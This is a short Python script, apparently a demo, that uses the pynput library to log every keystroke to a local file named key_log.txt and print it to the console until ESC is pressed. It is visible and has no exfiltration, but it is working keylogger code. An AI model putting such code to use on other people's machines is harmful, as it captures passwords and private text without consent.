from pynput import keyboard

# File to save key logs
log_file = "key_log.txt"

# Function to write keys to file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

# When a key is pressed
def on_press(key):
    try:
        print(f"Key Pressed: {key.char}")  # Normal keys
        write_to_file(key.char)
    except AttributeError:
        print(f"Special Key Pressed: {key}")  # Special keys like Enter, Shift
        write_to_file(str(key))

# When a key is released
def on_release(key):
    if key == keyboard.Key.esc:  # Press ESC to stop the program
        print("✅ ESC pressed! Stopping...")
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()